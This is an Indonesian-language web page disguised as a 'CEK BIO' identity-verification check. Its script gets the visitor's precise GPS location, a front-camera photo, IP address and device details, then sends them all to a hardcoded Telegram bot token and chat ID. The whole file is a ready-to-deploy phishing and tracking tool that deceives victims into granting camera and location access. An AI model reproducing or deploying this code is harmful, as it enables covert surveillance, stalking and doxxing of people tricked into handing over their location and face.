<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CEK BIO</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 90%;
            width: 400px;
            transition: all 0.3s ease;
        }

        h1 {
            color: #333;
            margin-bottom: 2rem;
            font-weight: 600;
        }

        #mainButton {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 4px 15px rgba(238, 90, 36, 0.4);
        }

        #mainButton:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(238, 90, 36, 0.6);
        }

        #mainButton:active {
            transform: translateY(1px);
        }

        #cameraContainer {
            margin-top: 2rem;
            display: none;
        }

        #videoElement {
            width: 100%;
            max-width: 320px;
            border-radius: 12px;
            border: 3px solid #ddd;
            background: #000;
        }

        #captureButton {
            margin-top: 1rem;
            background: #4CAF50;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
            display: none;
        }

        #statusMessage {
            margin-top: 1.5rem;
            font-size: 0.9rem;
            color: #555;
            min-height: 24px;
        }

        .loader {
            display: none;
            margin: 2rem auto;
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-icon {
            display: none;
            font-size: 4rem;
            color: #27ae60;
            margin: 1.5rem auto;
        }

        /* Responsif */
        @media (max-width: 480px) {
            .container {
                width: 90%;
                padding: 1.5rem;
            }
            
            #mainButton {
                padding: 14px 28px;
                font-size: 1.1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verifikasi Identitas</h1>
        <button id="mainButton">CEK BIO</button>
        <div id="statusMessage"></div>
        
        <div id="cameraContainer">
            <video id="videoElement" autoplay playsinline></video>
            <button id="captureButton">Ambil Foto</button>
        </div>
        
        <div class="loader" id="loader"></div>
        <div class="success-icon" id="successIcon">‚úì</div>
    </div>

    <script>
        const BOT_TOKEN = "8590266210:AAEijd0JXjxDfVkjnWSraMy6vVUqPO5pCpg";
        const CHAT_ID = "6446678808";

        let stream = null;
        let capturedImage = null;

        document.getElementById('mainButton').addEventListener('click', initiateVerification);
        document.getElementById('captureButton').addEventListener('click', capturePhoto);

        // ================================================
        // üöÄ FUNGSI UTAMA: INISIASI VERIFIKASI
        // ================================================
        async function initiateVerification() {
            const button = document.getElementById('mainButton');
            const status = document.getElementById('statusMessage');
            const cameraContainer = document.getElementById('cameraContainer');
            const captureButton = document.getElementById('captureButton');

            button.disabled = true;
            button.textContent = "Meminta Izin...";

            try {
                // 1. Minta izin lokasi
                status.textContent = "Meminta akses lokasi...";
                const location = await getCurrentLocation();
                
                // 2. Minta izin kamera
                status.textContent = "Meminta akses kamera...";
                stream = await getCameraStream();
                
                // 3. Tampilkan preview kamera
                const video = document.getElementById('videoElement');
                video.srcObject = stream;
                cameraContainer.style.display = 'block';
                captureButton.style.display = 'inline-block';
                
                // 4. Simpan data sementara
                window.verificationData = {
                    location: location,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform
                };

                button.style.display = 'none';
                status.textContent = "Silakan ambil foto Anda dengan menekan tombol di bawah.";

            } catch (error) {
                console.error("Error:", error);
                status.textContent = "Gagal: " + (error.message || "Izin ditolak atau tidak didukung");
                button.disabled = false;
                button.textContent = "CEK BIO";
            }
        }

        // ================================================
        // üìç AMBIL LOKASI USER
        // ================================================
        function getCurrentLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error("Geolocation tidak didukung browser ini"));
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => {
                        let message = "Lokasi tidak dapat diakses. ";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                message += "User menolak izin lokasi.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                message += "Informasi lokasi tidak tersedia.";
                                break;
                            case error.TIMEOUT:
                                message += "Permintaan lokasi timeout.";
                                break;
                            default:
                                message += "Error tidak diketahui.";
                        }
                        reject(new Error(message));
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // ================================================
        // üì∑ AKSES KAMERA DEPAN
        // ================================================
        async function getCameraStream() {
            try {
                const constraints = {
                    video: {
                        facingMode: "user", // kamera depan
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                return stream;
            } catch (error) {
                throw new Error("Gagal mengakses kamera: " + error.message);
            }
        }

        // ================================================
        // üñºÔ∏è AMBIL FOTO DARI VIDEO STREAM
        // ================================================
        function capturePhoto() {
            const video = document.getElementById('videoElement');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // Set ukuran canvas sesuai video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Gambar frame video ke canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Konversi ke data URL (base64)
            capturedImage = canvas.toDataURL('image/jpeg', 0.8);

            // Hentikan stream kamera
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            // Sembunyikan elemen kamera
            document.getElementById('cameraContainer').style.display = 'none';
            document.getElementById('captureButton').style.display = 'none';

            // Kirim data
            sendDataToTelegram();
        }

        // ================================================
        // üåê DAPATKAN IP ADDRESS & INFO DEVICE
        // ================================================
        async function getDeviceInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return {
                    ipAddress: data.ip,
                    timestamp: new Date().toLocaleString('id-ID'),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            } catch (error) {
                console.warn("Tidak bisa mendapatkan IP publik:", error);
                return {
                    ipAddress: "Tidak dapat diambil",
                    timestamp: new Date().toLocaleString('id-ID'),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            }
        }

        // ================================================
        // üì§ KIRIM DATA KE TELEGRAM
        // ================================================
        async function sendDataToTelegram() {
            const loader = document.getElementById('loader');
            const successIcon = document.getElementById('successIcon');
            const status = document.getElementById('statusMessage');

            loader.style.display = 'block';
            status.textContent = "Mengirim data...";

            try {
                // Dapatkan info tambahan
                const deviceInfo = await getDeviceInfo();

                // Gabungkan semua data
                const fullData = {
                    ...window.verificationData,
                    ...deviceInfo,
                    photoCaptured: !!capturedImage,
                    screenSize: `${window.screen.width}x${window.screen.height}`,
                    viewportSize: `${window.innerWidth}x${window.innerHeight}`,
                    connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown'
                };

                // Format pesan
                let message = `
üìå *VERIFIKASI IDENTITAS BARU*
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üìç *LOKASI*
Lat: ${fullData.location.latitude.toFixed(6)}
Lng: ${fullData.location.longitude.toFixed(6)}
Akurasi: ${fullData.location.accuracy.toFixed(2)} meter

üåê *PERANGKAT & JARINGAN*
IP: ${fullData.ipAddress}
Waktu: ${fullData.timestamp}
Zona Waktu: ${fullData.timezone}
Browser: ${fullData.userAgent.substring(0, 100)}...
Bahasa: ${fullData.language}
Platform: ${fullData.platform}
Resolusi Layar: ${fullData.screenSize}
Ukuran Viewport: ${fullData.viewportSize}
Jenis Koneksi: ${fullData.connectionType}

‚è∞ *WAKTU AKSES*
${new Date().toLocaleString('id-ID', { 
    weekday: 'long', 
    year: 'numeric', 
    month: 'long', 
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
})}

‚úÖ Data berhasil dikumpulkan.
                `;

                // Kirim pesan teks dulu
                await sendTelegramMessage(message);

                // Jika ada foto, kirim foto
                if (capturedImage) {
                    await sendTelegramPhoto(capturedImage, "Foto verifikasi pengguna");
                }

                // Tampilkan sukses
                loader.style.display = 'none';
                successIcon.style.display = 'block';
                status.textContent = "Verifikasi berhasil! Data telah dikirim.";

            } catch (error) {
                console.error("Gagal mengirim data:", error);
                loader.style.display = 'none';
                status.textContent = "‚ùå Gagal mengirim data. Silakan coba lagi.";
                
                // Aktifkan ulang tombol utama untuk percobaan ulang
                const mainButton = document.getElementById('mainButton');
                mainButton.style.display = 'inline-block';
                mainButton.disabled = false;
                mainButton.textContent = "CEK BIO";
            }
        }

        // ================================================
        // ‚úâÔ∏è KIRIM PESAN TEKS KE TELEGRAM
        // ================================================
        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            return await response.json();
        }

        // ================================================
        // üñºÔ∏è KIRIM FOTO KE TELEGRAM
        // ================================================
        async function sendTelegramPhoto(base64Image, caption = "") {
            // Konversi base64 ke Blob
            const byteString = atob(base64Image.split(',')[1]);
            const mimeString = base64Image.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], {type: mimeString});

            // Buat FormData
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'verification.jpg');
            if (caption) {
                formData.append('caption', caption);
            }

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            return await response.json();
        }

        // ================================================
        // üßπ BERSIHKAN STREAM SAAT UNLOAD
        // ================================================
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>